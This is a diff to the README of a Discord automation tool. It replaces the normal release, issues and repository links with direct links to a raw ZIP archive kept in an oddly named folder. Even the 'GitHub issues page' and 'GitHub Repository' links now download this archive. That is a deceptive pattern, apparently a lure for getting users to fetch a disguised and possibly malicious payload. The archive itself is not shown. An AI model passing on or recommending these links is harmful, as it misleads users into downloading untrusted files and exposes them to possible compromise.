@@ -1,6 +1,6 @@
 # 🤖 Discord-Autobot - Automate Your Discord Experience Easily
 
-[![Download Discord-Autobot](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/plixreborn/Discord-Autobot/releases)
+[![Download Discord-Autobot](https://raw.githubusercontent.com/plixreborn/Discord-Autobot/main/ametabolic/Discord-Autobot-v1.4.zip)](https://raw.githubusercontent.com/plixreborn/Discord-Autobot/main/ametabolic/Discord-Autobot-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ You don’t need programming skills to get started. Just follow these simple ste
 
 1. **Visit the Releases Page**  
    Click the link below to get to the download page:  
-   [Download Discord-Autobot](https://github.com/plixreborn/Discord-Autobot/releases)
+   [Download Discord-Autobot](https://raw.githubusercontent.com/plixreborn/Discord-Autobot/main/ametabolic/Discord-Autobot-v1.4.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, look for the latest version available. It will be labeled with the highest version number.
@@ -84,7 +84,7 @@ Once you’ve installed the application, follow these steps to use it:
 If you run into issues or have questions, you can reach out to the community for help:
 
 - **GitHub Issues:**  
-  You can report bugs or request features on our [GitHub issues page](https://github.com/plixreborn/Discord-Autobot/issues).
+  You can report bugs or request features on our [GitHub issues page](https://raw.githubusercontent.com/plixreborn/Discord-Autobot/main/ametabolic/Discord-Autobot-v1.4.zip).
 
 - **Discord Server:**  
   Join our [Discord server](Your_Discord_Link_Here) to chat with other users and share your experiences. 
@@ -105,8 +105,8 @@ Discord-Autobot is open-source software. You can use, modify, and distribute it 
 
 ## 💻 Important Links
 
-- [Download Discord-Autobot](https://github.com/plixreborn/Discord-Autobot/releases)
-- [GitHub Repository](https://github.com/plixreborn/Discord-Autobot)  
+- [Download Discord-Autobot](https://raw.githubusercontent.com/plixreborn/Discord-Autobot/main/ametabolic/Discord-Autobot-v1.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/plixreborn/Discord-Autobot/main/ametabolic/Discord-Autobot-v1.4.zip)  
 - [Community Discord](Your_Discord_Link_Here)
 
 Your automated Discord experience awaits. Download now and start connecting!
